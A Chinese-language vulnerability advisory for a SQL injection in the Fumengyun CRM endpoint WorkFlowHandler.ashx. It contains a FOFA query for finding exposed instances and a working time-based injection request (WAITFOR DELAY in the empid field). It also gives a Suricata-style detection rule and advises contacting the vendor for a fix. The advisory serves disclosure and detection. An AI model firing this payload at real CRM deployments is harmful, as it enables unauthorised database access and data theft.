# 孚盟云CRM WorkFlowHandler.ashx 存在SQL注入漏洞

孚盟云CRM WorkFlowHandler.ashx 存在SQL注入漏洞

# 影响版本

当下已发布版本

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa:**  **app=&quot;孚盟软件-孚盟云&quot;**

**POC/EXP：**

**step1 延时注入**

```
POST /m/Dingding/Ajax/WorkFlowHandler.ashx HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Cookie: UserCookie={"empId":"1","corpId": "1"}
Content-Type: application/x-www-form-urlencoded

action=GetProcessOverCount&empid=admin')))WAITFOR DELAY'0:0:5'-- -
```

​![image](assets/image-20260910011239-tswlr8t.png)​

**sonrt规则：**

```
alert http any any -> $HOME_NET any (
    msg:"Fumengyun CRM WorkFlowHandler.ashx SQLi - time-based generic (WAITFOR/SLEEP/BENCHMARK/PG_SLEEP)";
    flow:to_server,established;
    http.method; content:"POST"; nocase;
    http.uri;
        content:"/m/dingding/ajax/workflowhandler.ashx";
        fast_pattern;
        nocase;
    http.client_body;
        content:"empid="; nocase;
        pcre:"/empid=[^&]*?(?:waitfor\s+delay|sleep\s*\(|benchmark\s*\(|pg_sleep\s*\(|';waitfor|'\)\)\).*waitfor)/i";
    metadata:
        service http,
        affected_product "Fumengyun/孚盟云 CRM",
        vulnerability_type "SQL Injection (Time-based)",
        severity "high";
    classtype:web-application-attack;
    sid:1000802;
    rev:1;
    priority:1;
)
```

# 漏洞修复

联系孚盟（fumasoft.com）修复构建。

‍
